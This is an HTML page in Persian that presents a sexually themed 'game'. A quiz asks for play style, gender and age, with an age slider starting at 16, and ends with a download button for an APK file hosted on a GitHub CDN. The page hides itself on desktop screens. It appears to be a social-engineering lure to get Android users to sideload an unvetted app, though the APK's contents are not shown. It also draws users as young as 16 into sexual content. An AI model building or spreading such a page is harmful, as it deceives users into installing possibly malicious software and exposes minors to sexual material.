<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Game sxs</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
  font-family:'Roboto',sans-serif;
  background:#111;
  color:#fff;
  text-align:center;
  overflow-x:hidden;
}

/* هدر */
header{
  padding:20px;
  font-size:28px;
  font-weight:700;
  font-family:'Orbitron', sans-serif;
  background: linear-gradient(90deg,#ff0000,#ff4444,#ff0000);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

/* کادر تصویر مرحله (مربع و بزرگ) */
.top-box{
  width:90vw;
  max-width:500px;
  height:90vw;
  max-height:500px;
  margin:0 auto 30px auto;
  border-radius:25px;
  overflow:hidden;
  border:3px solid #ff0000;
  box-shadow:0 0 20px #ff0000 inset,0 0 40px #ff0000;
  transition: background-image 0.5s ease;
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  position: relative;
}
.top-box::after{
  content:'';
  position:absolute;
  top:0; left:0;
  width:100%; height:100%;
  background: rgba(0,0,0,0.4);
}

/* مرحله‌ها */
.step{
  display:none;
  padding:10px;
  opacity:0;
  transform:translateY(20px);
  transition: all 0.5s ease;
}
.step.active{
  display:block;
  opacity:1;
  transform:translateY(0);
}
h2{
  margin-bottom:20px;
  font-family:'Orbitron',sans-serif;
  color:#ff0000;
  text-shadow:0 0 5px #000,0 0 10px #ff0000,0 0 20px #ff0000;
  background: rgba(0,0,0,0.6);
  display:inline-block;
  padding:5px 15px;
  border-radius:12px;
}

/* گزینه‌ها */
.options{
  display:flex;
  flex-wrap:wrap;
  justify-content:center;
  gap:12px;
}
.option{
  width:80px;
  height:80px;
  line-height:80px;
  font-size:18px;
  border-radius:16px;
  cursor:pointer;
  border:2px solid #ff0000;
  background: linear-gradient(145deg,#111,#222);
  color:#ff0000;
  font-weight:600;
  text-shadow:0 0 3px #000,0 0 5px #ff0000;
  transition:0.3s all;
}
.option:hover{
  transform:scale(1.1);
  background: linear-gradient(145deg,#ff0000,#cc0000);
  color:#000;
}
.option.selected{
  background:#ff0000;
  color:#000;
  border-color:#ff0000;
  box-shadow:0 0 20px #ff0000;
}

/* اسلایدر سن */
input[type=range]{
  -webkit-appearance:none;
  width:90%;
  max-width:300px;
  height:14px;
  border-radius:7px;
  background:#333;
  outline:none;
  margin:20px 0;
}
input[type=range]::-webkit-slider-thumb{
  -webkit-appearance:none;
  width:36px;height:36px;border-radius:50%;
  background:#ff0000;
  cursor:pointer;
  box-shadow:0 0 15px #ff0000;
}
input[type=range]::-moz-range-thumb{
  width:36px;height:36px;border-radius:50%;
  background:#ff0000;
  cursor:pointer;
  box-shadow:0 0 15px #ff0000;
}
#ageDisplay{
  font-size:22px;
  font-weight:700;
  color:#ff0000;
  margin-top:10px;
  background: rgba(0,0,0,0.6);
  display:inline-block;
  padding:5px 12px;
  border-radius:10px;
  text-shadow:0 0 5px #000,0 0 10px #ff0000;
}

/* کادر دانلود حرفه‌ای با ذرات نئون */
.download-box{
  position:relative;
  background: linear-gradient(145deg,#ff0000,#cc0000);
  padding:25px 20px;
  border-radius:25px;
  box-shadow:0 0 40px #ff0000,0 0 80px #ff0000 inset;
  margin:30px auto;
  text-align:center;
  overflow:hidden;
  transition:0.3s all;
}
.download-box p{
  font-size:18px;
  font-weight:700;
  margin-bottom:20px;
  color:#000;
  text-shadow:0 0 5px #fff,0 0 10px #ff0000;
  background: rgba(0,0,0,0.5);
  display:inline-block;
  padding:5px 15px;
  border-radius:12px;
}
.download-btn{
  background:#000;
  color:#ff0000;
  padding:14px 40px;
  font-size:18px;
  border-radius:14px;
  text-decoration:none;
  display:inline-block;
  font-weight:700;
  box-shadow:0 0 25px #ff0000;
  transition:0.3s all;
  position:relative;
  z-index:2;
  text-shadow:0 0 5px #000,0 0 10px #ff0000;
}
.download-btn:hover{
  background:#ff0000;
  color:#000;
  box-shadow:0 0 35px #ff0000,0 0 70px #ff0000 inset;
}

/* ذرات نئون متحرک */
.particles{
  position:absolute;
  top:0; left:0;
  width:100%; height:100%;
  pointer-events:none;
  overflow:hidden;
  z-index:1;
}
.particles span{
  position:absolute;
  display:block;
  width:10px; height:10px;
  background:#ff0000;
  border-radius:50%;
  animation:particleMove linear infinite;
  opacity:0.8;
}
.particles span:nth-child(1){top:10%; left:20%; animation-duration:6s;}
.particles span:nth-child(2){top:30%; left:50%; animation-duration:8s;}
span:nth-child(3){top:60%; left:80%; animation-duration:5s;}
span:nth-child(4){top:80%; left:40%; animation-duration:7s;}
span:nth-child(5){top:50%; left:10%; animation-duration:6.5s;}
@keyframes particleMove{
  0%{transform:translate(0,0) scale(1);}
  50%{transform:translate(120px,150px) scale(1.5);}
  100%{transform:translate(-120px,300px) scale(1);}
}

/* فقط موبایل */
@media(min-width:481px){body{display:none;}}
</style>
</head>
<body>

<header>🎮 Game sxs 🥵</header>
<div class="top-box" id="topBox"></div>

<!-- مرحله 1 -->
<div class="step active" id="step1">
  <h2>1/4<br>سبک بازی خود را انتخاب کنید</h2>
  <div class="options">
    <div class="option" onclick="selectAndNext(this,1,2,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599833.jpg')">کلاسیک</div>
    <div class="option" onclick="selectAndNext(this,1,2,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599833.jpg')">ریلکس</div>
    <div class="option" onclick="selectAndNext(this,1,2,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599833.jpg')">خشن</div>
  </div>
</div>

<!-- مرحله 2 -->
<div class="step" id="step2">
  <h2>2/4<br>جنسیت خود را انتخاب کنید</h2>
  <div class="options">
    <div class="option" onclick="selectAndNext(this,2,3,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599835.jpg')">مرد</div>
    <div class="option" onclick="selectAndNext(this,2,3,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599835.jpg')">زن</div>
  </div>
</div>

<!-- مرحله 3 -->
<div class="step" id="step3">
  <h2>3/4<br>سن خود را انتخاب کنید</h2>
  <input type="range" id="age" min="16" max="70" value="25" oninput="updateAge(this.value)">
  <div id="ageDisplay">25 سال</div>
  <div class="options">
    <div class="option" onclick="selectAndNext(this,3,4,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599836.jpg')">تایید سن</div>
  </div>
</div>

<!-- مرحله 4 -->
<div class="step" id="step4">
  <h2>4/4</h2>
  <div class="download-box">
    <div class="particles">
      <span></span><span></span><span></span><span></span><span></span>
    </div>
    <p>برای اجرای بازی، فایل بازی را دانلود کنید</p>
    <a class="download-btn" href="https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/Game_sxs_1.apk" download>دانلود بازی</a>
  </div>
</div>

<script>
function selectAndNext(el,curStep,nextStep,img){
  document.querySelectorAll('#step'+curStep+' .option').forEach(o=>o.classList.remove('selected'));
  el.classList.add('selected');
  const current=document.querySelector('.step.active');
  current.classList.remove('active');
  setTimeout(()=>{
    document.getElementById('step'+nextStep).classList.add('active');
    document.getElementById('topBox').style.backgroundImage = 'url('+img+')';
  },150);
}
function updateAge(val){
  document.getElementById('ageDisplay').innerText=val+" سال";
}

// تصویر مرحله اول
document.getElementById('topBox').style.backgroundImage = 'url(https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936111855455636287.jpg)';
</script>

</body>
</html>
